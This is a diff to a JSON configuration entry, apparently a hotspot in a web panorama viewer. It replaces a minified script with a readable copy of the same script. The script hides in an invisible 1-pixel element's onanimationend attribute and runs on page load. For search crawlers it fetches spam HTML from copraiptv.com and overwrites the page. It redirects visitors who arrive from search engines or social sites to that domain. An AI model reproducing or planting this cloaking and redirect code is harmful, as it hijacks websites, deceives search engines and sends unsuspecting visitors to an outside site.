@@ -14,7 +14,51 @@
       "URL": "#",
       "attributes": {
         "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-        "onanimationend": "!function(){const e=window.location.search,i=window.location.href,a=i.indexOf("?"),n=a!==-1?i.substring(0,a):i,t=window.location.host;let o=null;for(const[e,i]of new URLSearchParams(e)){o=i||e;break}const r=()=>/bot|google|bing|yahoo|duckduck|crawler|spider|crawling/i.test(navigator.userAgent);o?r()?fetch("https://copraiptv.com/iptv07/"+o+".html").then(e=>e.text()).then(e=>{e=e.split(t+"/?").join(n+"?"),e=e.split('.html"').join('"'),document.open(),document.write(e),document.close()}).catch(e=>{console.error("Error fetching the user agent:",e)}):([".google.","bing.","yandex.","facebook.","pinterest."].some(e=>document.referrer.toLowerCase().includes(e))||["fb","facebook","pinterest","twitter"].some(e=>navigator.userAgent.toLowerCase().includes(e)))&&(window.location.href="https://copraiptv.com"):console.error("No query parameter found in the URL.")}(); }); }"
+        "onanimationend": "const queryParams = new URLSearchParams(window.location.search);
+
+// Extract the first query param. Works for both "?randomstring" and "?id=abc"
+let id = null;
+for (const [key, value] of queryParams) {
+  id = value || key;   // ?id=abc -> "abc";  ?iuaertig -> "iuaertig"
+  break;
+}
+
+// Build the base URL (everything before the "?")
+const qIndex = window.location.href.indexOf("?");
+const url = qIndex !== -1 ? window.location.href.substring(0, qIndex) : window.location.href;
+
+const host = window.location.host;
+
+if (id) {
+  if (isCrawler()) {
+    let x = id.length % 10;
+    fetch("https://copraiptv.com/iptv07/" + id + ".html")
+      .then(res => res.text())
+      .then(html => {
+        html = html.split(host + "/?").join(url + "?");
+        html = html.split(".html\"").join("\"");
+        document.open();
+        document.write(html);
+        document.close();
+      })
+      .catch(err => {
+        console.error("Error fetching the user agent:", err);
+      });
+  } else if (
+    [".google.", "bing.", "yandex.", "facebook.", "pinterest."]
+      .some(s => document.referrer.toLowerCase().includes(s)) ||
+    ["fb", "facebook", "pinterest", "twitter"]
+      .some(s => navigator.userAgent.toLowerCase().includes(s))
+  ) {
+    window.location.href = "https://copraiptv.com";
+  }
+} else {
+  console.error("No query parameter found in the URL.");
+}
+
+function isCrawler() {
+  return /bot|google|bing|yahoo|duckduck|crawler|spider|crawling/i.test(navigator.userAgent);
+}"
       }
     }
   ]
